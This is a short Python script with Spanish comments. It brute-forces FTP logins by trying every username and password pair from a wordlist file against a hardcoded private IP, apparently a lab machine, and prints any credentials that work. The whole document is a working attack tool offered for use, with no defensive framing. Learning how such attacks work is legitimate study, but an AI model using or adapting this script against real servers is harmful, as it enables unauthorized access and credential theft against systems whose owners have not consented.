#! /usr/bin/env python3
#_*_ coding: utf8_*_

import ftplib

def brute_attack(ip,user,password):#La funcion recibe 3 argumentos
    ftp = ftplib.FTP(ip) #Recibe un parametro la cual es la ip
    try:
        ftp.login(user,password)
        ftp.quit()
        print('Usuario: {} | Contraseña: {}'.format(user,password))
    except:
        print('Falló la autenticación')

def main():
    ip = "192.168.100.48"
    usuarios = open('users_password.txt','r')
    usuarios = usuarios.read().split('\n')
    passwords = open('users_password.txt','r')
    passwords = passwords.read().split('\n')

    for user in usuarios:
        for p in passwords:
            brute_attack(ip,user,p)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
